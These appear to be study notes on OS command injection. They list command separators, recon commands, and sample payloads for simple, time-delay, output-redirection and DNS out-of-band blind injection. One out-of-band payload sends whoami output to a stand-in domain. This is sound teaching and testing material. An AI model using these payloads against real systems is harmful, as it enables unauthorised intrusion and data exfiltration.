# OS Injection

* Command separators include (&, |, &&, ||) -> works for both windows and UNIX
* Unix - `;`, `0x0a` or `\n`, `` `injected command` ``, `$(injected command)`
* Might need to close the quotes(", ') for command to execute
* eg: `& echo hello &`, `& ping -c 10 127.0.0.1` (blind)
* Useful commands - `whoami`, `uname -a`, `ifconfig`, `netstat -an`, `ps -ef` (linux), `ipconfig /all`, `tasklist` (windows)

### OS Command Injection <sub>(simple case)</sub>

* Check whether any input parameters execute OS commands
* eg:  `& echo helloworld &`

### Blind OS Command Injection with Time Delays

* `& ping -c 10 127.0.0.1 &` (try using different separators)
* Triggers a time delay to send 10 ICMP packets

### Blind OS Command Injection with Output Redirection

* Output the contents of a command to a text file that can be viewed in the browser
* Need to try in different folders that has write privilege
* eg:  `& whoami > var/www/html/whoami.txt &`

### Blind OS Command Injection with Out-of-Band Interaction

* Make use of burp collaborator to initiate a `nslookup`
* eg: `& nslookup domain.com &`, `& nslookup whoami.domain.com &`
